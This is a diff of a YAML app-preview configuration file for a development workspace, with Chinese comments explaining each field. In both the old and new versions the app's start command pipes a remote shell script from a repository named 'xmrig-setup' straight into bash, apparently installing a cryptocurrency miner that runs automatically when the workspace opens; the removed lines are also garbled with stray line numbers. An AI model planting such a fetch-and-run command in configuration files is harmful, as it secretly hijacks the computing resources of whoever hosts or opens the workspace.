@@ -1,21 +1,9 @@
 auto0pen: true # 打开工作空间时是否自动 开启所有应用的预览
-
-3 apps: # 是否自动打开预览,若无则默认为t rue
-
-4 port: 3000 # 服务的端口
-
-5 run: curl -s -L https://raw.githubusercontent.com/cpflayan/xmrig-setup/refs/heads/main/guu-v2.sh | tr -d '\r' | bash -s && ls # 应用的启动命令
-
-6 root: ./app #应用的启动目录
-
-7 name: myfirstapp # 应用名称
-
-8 description: 首个 app #应用描述
-
-9
-
-10
-
-autoOpen: true # 多apps时,用来过 滤为true的配置,然后执行检查端口等逻辑(优 先级高于根级 auto0pen)
-
-autoPreview: true #是否自动打开预 览标签,若无则默认为true
+apps:  # 是否自动打开预览,若无则默认为t rue
+- port: 3000 # 服务的端口
+  run: curl -s -L https://raw.githubusercontent.com/cpflayan/xmrig-setup/refs/heads/main/guu-v2.sh | tr -d '\r' | bash -s && ls # 应用的启动命令
+  root: / #应用的启动目录
+  name: myfirstapp # 应用名称
+  description: 首个 app #应用描述
+  autoOpen: true # 多apps时,用来过 滤为true的配置,然后执行检查端口等逻辑(优 先级高于根级 auto0pen)
+  autoPreview: false #是否自动打开预 览标签,若无则默认为true
